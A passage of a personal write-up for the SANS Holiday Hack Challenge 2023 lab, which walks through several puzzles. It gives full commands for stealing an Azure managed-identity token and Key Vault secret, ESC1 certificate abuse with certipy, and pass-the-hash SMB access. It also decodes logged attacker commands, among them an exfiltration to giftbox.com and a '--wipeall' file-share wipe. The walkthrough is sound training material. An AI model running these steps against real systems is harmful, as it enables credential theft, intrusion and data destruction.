TOKEN=$(curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' --header "Metadata: true" | jq -r .access_token)
HEADER="Authorization: Bearer $TOKEN"
curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets?maxresults=1&api-version=7.4" | jq
```

```json
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

Now that we know the name of the secret, we can query its value directly by appending it to the request URL.

```sh
curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?maxresults=1&api-version=7.4" | jq
```
This returns a JSON object with the value along with a bunch of unnecessary attributes.

```json
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

To fetch the value of the script in its raw form we can repeat the request piping it to `jq`. We can query the value using `jq` by using the
`--raw-output` flag or its shorthand `-r` followed by the `value` argument.


```sh
curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?maxresults=1&api-version=7.4" | jq -r .value
```

Inside the retrieved PowerShell script, we find that the password to the Active Directory box is hard-coded.

```powershell
Import-Module ActiveDirectory; $UserName = "elfy"; $UserDomain = "northpole.local"; $UserUPN = "$UserName@$UserDomain"; $Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force; $DCIP = "10.0.0.53"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

I will set this password as an environment variable for easy access in later commands.

```sh
PW='J4`ufC49/J4766'
```
Now we can use smbclient with that environment variable for logging in as Elfie into `northpole.local`.

```
smbclient.py "northpole.local/elfy:$PW@10.0.0.53"
```

We will use the `shares` command to list the available shares.

```
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
```

The share that stands out to us is FileShare. Let's `use` it and list its contents.

```
# use FileShare
# ls
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
drw-rw-rw-          0  Sun Dec 17 01:15:09 2023 ..
-rw-rw-rw-     701028  Sun Dec 17 01:15:12 2023 Cookies.pdf
-rw-rw-rw-    1521650  Sun Dec 17 01:15:12 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Sun Dec 17 01:15:12 2023 SignatureCookies.pdf
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 super_secret_research
-rw-rw-rw-        165  Sun Dec 17 01:15:12 2023 todo.txt
```

We can try reading the `todo.txt` file since it might contain hints as to our next objective.

```
# cat todo.txt
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit
```

The `super_secret_research` directory is restricted only to researchers, we can even test this by trying to list the directory which yields an error.

```sh
certipy find \
  -vulnerable \
  -username elfy@northpole.local \
  -dc-ip 10.0.0.53 \
  -password "$PW"
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

Password:
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231217073626_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231217073626_Certipy.txt'
[*] Saved JSON output to '20231217073626_Certipy.json'
```

```sh
cat 20231217073626_Certipy.txt
```

```
Certificate Authorities
  0
    CA Name                             : northpole-npdc01-CA
    DNS Name                            : npdc01.northpole.local
    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local
    Certificate Serial Number           : 20FD42CE45230A9240182C3AFEFE0E32
    Certificate Validity Start          : 2023-12-17 01:06:31+00:00
    Certificate Validity End            : 2028-12-17 01:16:30+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : NORTHPOLE.LOCAL\Administrators
      Access Rights
        ManageCertificates              : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        ManageCa                        : NORTHPOLE.LOCAL\Administrators
                                          NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Enroll                          : NORTHPOLE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : NorthPoleUsers
    Display Name                        : NorthPoleUsers
    Certificate Authorities             : northpole-npdc01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Domain Users
                                          NORTHPOLE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

```sh
samrdump.py "elfy:$PW@northpole.local" -dc-ip 10.0.0.53 -target-ip 10.0.0.53
```

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Retrieving endpoint list from northpole.local
Found domain(s):
 . NORTHPOLE
 . Builtin
[*] Looking up users in domain NORTHPOLE
Found user: alabaster, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: elfy, uid = 1104
Found user: wombleycube, uid = 1105
alabaster (500)/FullName: 
alabaster (500)/UserComment: 
alabaster (500)/PrimaryGroupId: 513
alabaster (500)/BadPasswordCount: 0
alabaster (500)/LogonCount: 12
alabaster (500)/PasswordLastSet: 2023-12-17 01:04:41.727656
alabaster (500)/PasswordDoesNotExpire: False
alabaster (500)/AccountIsDisabled: False
alabaster (500)/ScriptPath: 
Guest (501)/FullName: 
Guest (501)/UserComment: 
Guest (501)/PrimaryGroupId: 514
Guest (501)/BadPasswordCount: 0
Guest (501)/LogonCount: 0
Guest (501)/PasswordLastSet: <never>
Guest (501)/PasswordDoesNotExpire: True
Guest (501)/AccountIsDisabled: True
Guest (501)/ScriptPath: 
krbtgt (502)/FullName: 
krbtgt (502)/UserComment: 
krbtgt (502)/PrimaryGroupId: 513
krbtgt (502)/BadPasswordCount: 0
krbtgt (502)/LogonCount: 0
krbtgt (502)/PasswordLastSet: 2023-12-17 01:12:44.507181
krbtgt (502)/PasswordDoesNotExpire: False
krbtgt (502)/AccountIsDisabled: True
krbtgt (502)/ScriptPath: 
elfy (1104)/FullName: 
elfy (1104)/UserComment: 
elfy (1104)/PrimaryGroupId: 513
elfy (1104)/BadPasswordCount: 0
elfy (1104)/LogonCount: 0
elfy (1104)/PasswordLastSet: 2023-12-17 01:14:46.618692
elfy (1104)/PasswordDoesNotExpire: True
elfy (1104)/AccountIsDisabled: False
elfy (1104)/ScriptPath: 
wombleycube (1105)/FullName: 
wombleycube (1105)/UserComment: 
wombleycube (1105)/PrimaryGroupId: 513
wombleycube (1105)/BadPasswordCount: 0
wombleycube (1105)/LogonCount: 96
wombleycube (1105)/PasswordLastSet: 2023-12-17 01:14:46.727971
wombleycube (1105)/PasswordDoesNotExpire: True
wombleycube (1105)/AccountIsDisabled: False
wombleycube (1105)/ScriptPath: 
[*] Received 5 entries.
```

```sh
certipy req -username elfy@northpole.local -password "$PW" -ca northpole-npdc01-CA -target npdc01.northpole.local -dc-ip 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local -dns npdc01.northpole.local
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 75
[*] Got certificate with multiple identifications
    UPN: 'wombleycube@northpole.local'
    DNS Host Name: 'npdc01.northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'wombleycube@northpole.local'
    [1] DNS Host Name: 'npdc01.northpole.local'
> 0
[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

```sh
alabaster@ssh-server-vm:~$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -target-ip 10.0.0.53 wombleycube@northpole.local 
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use FileShare
# cd super_secret_research
# ls
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 ..
-rw-rw-rw-        231  Sun Dec 17 01:15:12 2023 InstructionsForEnteringSatelliteGroundStation.txt
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

The name of the inaccessible filename is `InstructionsForEnteringSatelliteGroundStation.txt`.

Submitting this unlocks the Spaceport Point area of Space Island.

# Space Island: Spaceport Point

The abundance of trees in this jungle blocks the view. In order to handle this, we can go to the devtools and lookup what resource is being loaded for these trees.

It appears that there are two types of trees, each loaded from the resources `space_palm4.png` and `space_palm2.png`. We can go to the network tab, filter for these filenames
and block them. To see the blocking in action, we must hard refresh the page by pressing `ctrl` `F5`.

Just like that, the trees are gone!

Moving forward while avoiding the frames for the trees, we will find a microphone which opens the doors to the carriage next to it only when a certain phrase is said by
Wombley Cube. This phrase is evidently the contents of the file we found at the end of the active directory challenge.

# Space Island: Cape Cosmic

Yeah, nothing really happened here. The place is fenced.

# Film Noir Island: Chiaroscuro City

Wombley Cube gives us a free audiobook to listen to.

## Na'an

We have to play a game called "Shifty's Card Shuffle", we must pick five unique cards numbering from 0-9. Shifty also picks 5 cards. Whoever picks the lowest and highest numbers gets a point for each. If our card and shifty's are the same, that number is canceled out.
The first one to 10 points wins.

If we play by the rules and pick a number from 0 through 9, Shifty always picks cards that are lower or higher than ours respectively. However, Shifty mentions that the game is made with Python and as the name of the challenge suggests, we can represent NaN (not a number)
as a floating point number in Python. Special floating point numbers like `NaN` and `Inf` (infinity) are part of the IEEE 754 standard and is available in most programming languages.

The trick here is that a comparison checking if a number is greater than `NaN` will always evaluate to false. We can test the following in the devtools console:

```js
5 > NaN
```

This results in `false`. The same applies to the less than sign.

To win every card pick, all our card must be `NaN`. However, the game prevents us from using the same number (or string) for multiple cards.
A quick and easy solution to this is to use different capitalization of the word `NaN` for each pick.

We will fill each card with `nan`, `naN`, `nAn`, `nAN` and `Nan` respectively.

![The different capitalizations of NaN for each pick](/kringlecon/2023/naan-00.avif)

After around 5 iterations of the game, we score 10 before Shifty and win the game!

![We are cleverer than most tourists](/kringlecon/2023/naan-01.avif)

# Film Noir Island: Gumshoe Alley PI Office

For the KQL kraken hunt, we must create a free cluster [from here](https://dataexplorer.azure.com/freecluster).

Next we visit the [challenge website](https://detective.kusto.io/sans2023) and after clicking on the "Log in" button in the top right corner, we paste the data claster URL.

I have blurred my URL since it acts like a secret but after pasting it, we click on the login button in the prompt.

I clicked run. I went through the tutorial. I came back. I clicked "Train me for the case."

### Training

I ran the following query:

```nushell
Employees
| take 10
```

I get the following table:

![A table showing the first 10 employees](/kringlecon/2023/kusto-00-employees.avif)

The training prompt also states the following:

> 🎯Key Point – What to do when you don't know what to do:
> Whenever you are faced with an unfamiliar database table, the first thing you should do is sample its rows using the take operator. That way, you know what fields are available for you to query and you can guess what type of information you might extract from the data source.

Multiple queries must be separated by a newline. To run one of multiple queries, click on the line associated with it.

1. The training asks us to query which employee has the IP address of `10.10.0.19`. We run the following query:

```nushell
Employees
| where ip_addr == '10.10.0.19'
```

![The output of the query](/kringlecon/2023/kusto-01.avif)

The resultant table had one entry with "Candy Cane Sugarplum" in the name field. This was the correct answer.

2. How many emails did Santa Claus receive?

```nushell
Email
| where recipient =~ "santa_claus@santaworkshopgeeseislands.org"
| count
```

Answer: 19

3. How many unique websites did Rudolph Rednose visit?

We look up Rudolph's IP address.

```
Employees 
| where name == "Rudolph Wreathington"
```

With the IP address "10.10.0.75", we query the outbound newtwork connections
for distinct counts for the field `url`.

```nushell
OutboundNetworkEvents 
| where src_ip == "10.10.0.75"
| summarize dcount(url)
```

![The output of the query](/kringlecon/2023/kusto-02.avif)

Answer: 59

For some reason, the answer arising from my solution and the one provided (using `| distinct url | count`)
are considered incorrect. Don't fret, this is not he real thing anyways.

### The Challenges

#### Welcome Challenge
1. How many Craftperson Elf's are working from laptops?

```nushell
Employees
| where role == "Craftsperson Elf" and hostname has "LAPTOP"
| count
```

Answer: 25

![The output of the query](/kringlecon/2023/kusto-03.avif)

#### Welcome to Operation Giftwrap: Defending the Geese Island network

> An urgent alert has just come in, 'A user clicked through to a potentially malicious URL involving one user.' This message hints at a possible security incident, leaving us with critical questions about the user's intentions, the nature of the threat, and the potential risks to Santa's operations. Your mission is to lead our security operations team, investigate the incident, uncover the motives behind email, assess the potential threats, and safeguard the operations from the looming cyber threat.
The clock is ticking, and the stakes are high - are you up for this exhilarating challenge? Your skills will be put to the test, and the future of Geese Island's digital security hangs in the balance. Good luck!
The alert says the user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'

1. What is the email address of the employee who received this phishing email?

We search for the email where the link has this phishing document.

```
Email
| where link has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

The query ends up with one record where the recipient to be `alabaster_snowball@santaworkshopgeeseislands.org`.

![](/kringlecon/2023/gumshoe-alley-pi-office-02.avif)

Answer: alabaster_snowball@santaworkshopgeeseislands.org

2. What is the email address that was used to send this spear phishing email?

From the same record we can observe the sender email to be `cwombley@gmail.com`.

Answer: cwombley@gmail.com

3. What was the subject line used in the spear phishing email?

Double clicking on the subject cell of the aforementioned record shows us the subject used for the email.

![]()

Answer: `[EXTERNAL] Invoice foir reindeer food past due`

#### Someone got phished! Let's dig deeper on the victim...

> Nicely done! You found evidence of the spear phishing email targeting someone in our organization. Now, we need to learn more about who the victim is!
If the victim is someone important, our organization could be doomed! Hurry up, let's find out more about who was impacted!

1. What is the role of our victim in the organization?

We can query the Employees table with the name `Alabaster Snowball` to look for their role.

```
Employees
| where name == "Alabaster Snowball"
```

The record shows the role to be `Head Elf`.

![]()

Answer: `Head Elf`

2. What is the hostname of the victim's machine?

From the same output record, we find the hostname of Alabaster's machine.

Answer: `Y1US-DESKTOP`

3. What is the source IP linked to the victim?

The fourth column of the same record also gives us the IP address of the machine.

![]()

Answer: `10.10.0.4`

We submit our answer which marks this email done.

#### That's not good. What happened next?

> The victim is Alabaster Snowball? Oh no... that's not good at all! Can you try to find what else the attackers might have done after they sent Alabaster the phishing email?
Use our various security log datasources to uncover more details about what happened to Alabaster.

1. What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!

We can query the outbound connections and look for when the link was connected to.

```
OutboundNetworkEvents
| where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```

Expanding the timestamp column, we get the exact timestamp of the click event.

![]()

Answer: `2023-12-02T10:12:42Z`

2. What file is dropped to Alabaster's machine shortly after he downloads the malicious file?

To find the dropped file, we will query the `FileCreationEvents` table. We will narrow the search down to match Alabaster's machine's hostname
and use the `timestamp between ( start .. end )` condition to search for file creation in an 8 minute window (upto 10:20:00).

Note: to convert the raw string to a parsable timestamp, we use the `datetime` operator.

```
FileCreationEvents
| where hostname == "Y1US-DESKTOP" and timestamp between ( datetime(2023-12-02T10:12:42) .. datetime(2023-12-02T10:20:00) )
```

The first of the two resulting records is the downloaded document. However, the second one gives us the name of the
dropped malware.

![]()

Answer: `giftwrap.exe`

#### A compromised host! Time for a deep dive.

> Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad.
Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!

1. The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?

From the previous query, the file `giftwrap.exe` was created at the timestamp `2023-12-02T10:14:21Z`.

Since the outbound connections table does not contain columns for the destination IP address but only URLs,
we must take a look at the process related events after the suspicious file was dropped.

```
ProcessEvents
| where hostname == "Y1US-DESKTOP" and timestamp > datetime(2023-12-02T10:14:21Z)
```

The fourth record shows us the execution of the command `ligolo`. A quick web search reveals that it is
a tool for making revese tunnels easy. Right next to the `--to` flag, we find the IP where the connection was forwarded to.

2. What is the timestamp when the attackers enumerated network shares on the machine?

Since the attacker is using `cmd.exe` and `powershell.exe` for command invocation, we will narrow down our query to only match
`parent_process_name`s of the respective processes.

```
ProcessEvents
| where hostname == "Y1US-DESKTOP" and (parent_process_name == 'cmd.exe' or parent_process_name == 'powershell.exe')
```

A few records down, we see the attacker executing the command `net share`. From there, we can extract the associated timestamp.

Answer: `2023-12-02T16:51:44Z`

3. What was the hostname of the system the attacker moved laterally to?

At timestamp `2023-12-24T15:14:25` we can notice the attacker running the `net use` command to connect to the `Northpolefileshare`
device and move laterally.

Answer: `Northpolefileshare`

#### A hidden message

> Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening?
 
> Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck!
 
> If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen.

1. When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?

![]()

Powershell can be supplied base64 commands directly through the `-enc` flag as we see in this case.
To narrow down base64 encoded commands further, we will query only those process events where the process's commandline contains the `-enc` flag.

```
ProcessEvents
| where hostname == "Y1US-DESKTOP" and (parent_process_name == 'cmd.exe' or parent_process_name == 'powershell.exe') and process_commandline has "-enc"  
```

We make sure to sort timestamp as ascending.

Now let's decode each record. To do this, we copy the part of the command
after the `-enc` flag and run the following command:

```
echo THEBASE64STRING | base64 -d
```

Keep in mind, we replace `THEBASE64STRING` with the thing we just copied.

Let's decode the first base64 string.

```sh
echo SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs \
| base64 -d
```

```powershell
Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null
```

Nope, this looks like a legitimate command for installing Windows updates. Let's try the second one.

The base64 command in the second record when decoded as follows

```sh
echo KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn \
| base64 -d
```

yields the following powershell command:

```powershell
( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''
```

Now that is some obfuscated command we can expect an attacker to invoke. We note the timestamp for this second record and submit it.

![]()

![]()

Answer: `2023-12-24T16:07:47Z`

2. What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)

From the previous query output, we can try decoding the encoded commands one by one.

The `-split '' | %{$_[0]}` part of the command splits the preceding string into its constituent characters,
these are then rearranged in reverse and the trailing `-join ''` joins the reversed characters back into a string.

Undoing the reverse, we get the following command:

```powershell
powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt
```

We see that the attacker copied the `NaughtyNiceList.txt` file from the fileshare to `C:\Desktop`.

Answer: `NaughtyNiceList.txt`

3. The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

We move on to decode the base64 encoded command in the third record.

![]()

```sh
echo W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4= \
| base64 -d
```

This gives us the following obfuscated command:

```powershell
[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2]-joiN
```

This obfucation technique relies on representing each character in a string as their ASCII numeric representation, which are later reconstructed when running the command.

To perform the reconstruction manually we can run the following python code:

```py
encoded = (100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101)
print(''.join(map(chr, encoded)))
```

This yields the following decoded version of the command:

```
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```

Here we notice the attacker using an executable called `downwithsanta.exe` with the `-exfil` flag to probably exfiltrate the `NaughtyNiceList.docx` to `giftbox.com`.

Answer: `giftbox.com`

#### The final step!

> Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing...

> We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran?

1. What is the name of the executable the attackers used in the final malicious command?

Let's decode the final powershell encoded command. As an aside, this coincides to be the last command the attacker ran if we removed the `-enc` filter.

![evidence that it was the last command]()

![]()

```sh
echo QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ= | base64 -d
```

This decodes to the following powershell command:

```powershell
C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
```

This shows the attacker running the `downwithsanta.exe` executable.

Answer: `downwithsanta.exe`

2. What was the command line flag used alongside this executable?

In the previous decoded command we also noted that the attacker used the `--wipeall` with the executable.

Answer: `--wipeall`

#### The flag

After submitting all the answers, we are asked to complete our objective in HHC by submitting the output of the following command:

```py
print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
```

This decodes to `Beware the Cube that Wombles`. We submit this in our objectives tab and mark this complete.

# Film Noir Island: The Blacklight District

## Phish Detection

![Intro to the phish detection challenge](/kringlecon/2023/phish.avif)

> Attention, Digital Defenders! You've entered the realm of the Phishing Detection Agency, where advanced AI meets human insight. It's been reported that AI has started hallucinating, and it's up to you to discern the reality behind these emails.

> Key: In the shadow-laden corridors of our menu, the Phishing link casts a crimson hue, a siren's call warning that the number of deceitful emails is amiss. Should our digital sleuthing align perfectly with the cunning of these tricksters, watch as it transforms, glowing an emerald green in triumphant success.

> Collaboration with ChatNPT: In our ongoing battle against phishing, we've enlisted ChatNPT to preliminarily flag potential phishing attempts. These flagged emails are stored in the Phishing Folder. However, AI isn't foolproof! It's up to you, the astute investigator, to dive into these emails and confirm their legitimacy. Cross-reference with our DNS records, apply your knowledge of SPF, DKIM, and DMARC, and ensure that only true phishing threats remain in the Phishing Folder. Your keen eye for detail is crucial in outsmarting these digital tricksters!

> Your mission: Navigate through our virtual vault of emails, employ your knowledge of SPF, DKIM, and DMARC, and identify those deceptive, phishing attempts.

![](/kringlecon/2023/phish-00.avif)

Welcome to the Geese Islands Email Security Overview. This page serves as a guide to understanding the key components of email authentication and security for our domain. Below, you will find detailed information about our SPF, DKIM, and DMARC records – the three pillars that fortify our email communications against phishing and spoofing attacks. Each section provides insights into what these records are, their importance in maintaining email integrity, and how they are configured for the utmost security of our digital correspondence.

- SPF Record: Ensures emails are sent from authorized servers.
  - Domain: geeseislands.com
  - Type: TXT
  - Value: v=spf1 a:mail.geeseislands.com -all
- DKIM Record: Verifies that the email message is not forged.
  - Domain: geeseislands.com
  - Type: TXT
  - Value: v=DKIM1;t=s;p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDjtqsLqwecFGF7AmP+Siln86O1v9NOKJw4ZsEHDV5fo0Vjj0qNPyyARKSkDmnIKjnzLGUUQO31Fr+vdZU61IaI9/ZD39WJKaAeX96uQ65mRQqqPVYxPLN5OvuFRmIHJ/TgOkD6z5/7VM7Zs1kw5Qnl04FmOLwWd00D+uNZnj8TCwIDAQAB
- DMARC Record: Specifies how an email receiver should handle emails that fail SPF and DKIM checks.
  - Domain: geeseislands.com
  - Type: TXT
  - Value: v=DMARC1; p=reject; pct=100; rua=mailto:dmarc-reports@geeseislands.com

![](/kringlecon/2023/phish-01.avif)

For any of the emails having the DKIM domain (`d`) parameter `mail.geeseislands.com`, DMARC as `Pass` and optionally SPF as `pass`,
we mark them safe. If the values differ or the domain is entirely different, we mark it as phishing.

These were all the challenges that I could solve before other matters took precedence. I hope you learned something or at the very least, were amused by my crude way of solving things.

Bye now.
